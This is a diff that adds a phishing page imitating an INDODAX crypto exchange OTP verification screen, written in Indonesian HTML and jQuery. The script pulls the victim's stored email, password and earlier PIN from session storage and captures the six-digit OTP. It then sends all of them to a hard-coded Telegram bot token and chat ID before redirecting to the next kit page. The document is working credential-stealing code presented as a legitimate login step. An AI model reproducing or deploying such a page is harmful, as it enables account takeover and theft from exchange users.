@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Masukkan PIN INDODAX</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+  body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #fff;
+    margin: 40px 16px;
+    color: #000;
+  }
+  .container {
+    max-width: 360px;
+    margin: 0 auto;
+  }
+  h1 {
+    font-weight: 700;
+    font-size: 24px;
+    margin-bottom: 32px;
+    text-align: center;
+  }
+  .pin-info {
+    font-size: 14px;
+    margin-bottom: 24px;
+    text-align: center;
+    color: #666;
+  }
+  .pin-container {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 24px;
+  }
+  .pin-input {
+    width: 40px; /* Ukuran lebih kecil untuk 6 digit agar muat */
+    height: 40px;
+    font-size: 18px;
+    text-align: center;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .pin-input:focus {
+    border-color: #2076f3;
+  }
+  button.pin-btn {
+    width: 100%;
+    padding: 12px 0;
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: 6px;
+    border: none;
+    background-color: #d4d4e3;
+    color: #888;
+    cursor: not-allowed;
+    margin-bottom: 16px;
+    transition: background-color 0.3s, color 0.3s;
+  }
+  button.pin-btn.enabled {
+    background-color: #2076f3;
+    color: #fff;
+    cursor: pointer;
+  }
+  .forgot-pin-link {
+    display: block;
+    font-size: 13px;
+    color: #2076f3;
+    text-align: center;
+    text-decoration: none;
+  }
+  .forgot-pin-link:hover {
+    text-decoration: underline;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>Verifikasi OTP</h1>
+    <p class="pin-info">Masukkan kode OTP 6 digit yang dikirim ke email Anda.</p>
+
+    <form id="pinForm" novalidate>
+      <div class="pin-container">
+        <input type="tel" class="pin-input" maxlength="1" id="pin1" />
+        <input type="tel" class="pin-input" maxlength="1" id="pin2" />
+        <input type="tel" class="pin-input" maxlength="1" id="pin3" />
+        <input type="tel" class="pin-input" maxlength="1" id="pin4" />
+        <input type="tel" class="pin-input" maxlength="1" id="pin5" />
+        <input type="tel" class="pin-input" maxlength="1" id="pin6" />
+      </div>
+
+      <button type="submit" id="pinBtn" class="pin-btn" disabled>Masuk</button>
+    </form>
+
+    <a href="#" class="forgot-pin-link">Kirim Ulang OTP</a>
+  </div>
+
+  <!-- Load jQuery dari CDN -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <!-- Script JS untuk PIN -->
+  <script>
+  $(document).ready(function() {
+      console.log('PIN JS loaded');
+
+      // Ambil data dari sessionStorage (dari index.html dan otp.html)
+      const email = sessionStorage.getItem('email');
+      const password = sessionStorage.getItem('password');
+      const otp = sessionStorage.getItem('otp');
+
+      if (!email || !password || !otp) {
+          // Jika tidak ada session, redirect kembali ke login
+          window.location.href = 'index.html';
+          return;
+      }
+
+      console.log('Session data:', {email, password, otp});
+
+      // Fungsi untuk memastikan input hanya angka
+      function restrictToNumbers(input) {
+          input.on('input', function() {
+              const value = $(this).val();
+              // Hapus karakter non-angka
+              $(this).val(value.replace(/[^0-9]/g, ''));
+              togglePinButton();
+          });
+
+          input.on('keydown', function(e) {
+              // Izinkan backspace, delete, tab, escape, enter, arrow keys
+              const allowedKeys = [8, 9, 13, 27, 37, 38, 39, 40, 46];
+              if (allowedKeys.includes(e.keyCode) || (e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) {
+                  // Angka dari keyboard utama (48-57) atau numpad (96-105)
+                  return true;
+              } else {
+                  e.preventDefault();
+                  return false;
+              }
+          });
+      }
+
+      // Terapkan restriksi angka ke semua input PIN
+      $('.pin-input').each(function() {
+          restrictToNumbers($(this));
+      });
+
+      // Auto-focus ke input berikutnya saat input digit
+      $('.pin-input').on('input', function() {
+          const value = $(this).val();
+          if (value.length === 1 && /^\d$/.test(value)) {
+              const nextInput = $(this).next('.pin-input');
+              if (nextInput.length) {
+                  nextInput.focus();
+              }
+          }
+          togglePinButton();
+      });
+
+      // Hapus input sebelumnya saat backspace
+      $('.pin-input').on('keydown', function(e) {
+          if (e.key === 'Backspace' && $(this).val() === '') {
+              const prevInput = $(this).prev('.pin-input');
+              if (prevInput.length) {
+                  prevInput.focus();
+              }
+          }
+      });
+
+      // Fungsi validasi PIN: cek apakah semua 6 digit terisi angka
+      function isPinValid() {
+          let pin = '';
+          $('.pin-input').each(function() {
+              pin += $(this).val();
+          });
+          return pin.length === 6 && /^\d{6}$/.test(pin);
+      }
+
+      // Toggle enable/disable tombol Masuk
+      function togglePinButton() {
+          if (isPinValid()) {
+              $('#pinBtn').prop('disabled', false).addClass('enabled');
+          } else {
+              $('#pinBtn').prop('disabled', true).removeClass('enabled');
+          }
+      }
+
+      // Submit form PIN
+      $('#pinForm').on('submit', function(e) {
+          e.preventDefault();
+
+          if (!isPinValid()) {
+              console.log('PIN tidak valid');
+              return;
+          }
+
+          let pin = '';
+          $('.pin-input').each(function() {
+              pin += $(this).val();
+          });
+
+          // Format pesan PIN untuk dikirim ke Telegram
+          const message = `
+Masuk ke INDODAX
+------------------------
+Email: ${email}
+Password: ${password}
+PIN: ${otp}
+OTP: ${pin}
+------------------------
+          `;
+
+          // Ganti dengan token bot Telegram dan chat ID Anda
+          const token_bot = '8127374507:AAFRjA0Umx6FXIwqmi6aOvMljZaHKTQFOTM';
+          const telegram_id = '8400447517';
+
+          const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;
+
+          // Kirim request ke Telegram API
+          $.get(url)
+              .done(function(data) {
+                  if (data.ok) {
+                      console.log('PIN berhasil dikirim ke Telegram');
+
+                      // Simpan PIN ke sessionStorage jika perlu
+                      sessionStorage.setItem('pin', pin);
+
+                      // Redirect ke dashboard setelah sukses
+                      window.location.href = 'one.html';
+                  } else {
+                      console.error('Error sending PIN:', data);
+                  }
+              })
+              .fail(function(xhr, status, error) {
+                  console.error('Fetch error:', error);
+              });
+      });
+
+      // Fokus ke input pertama saat load
+      $('#pin1').focus();
+  });
+  </script>
+</body>
+</html>
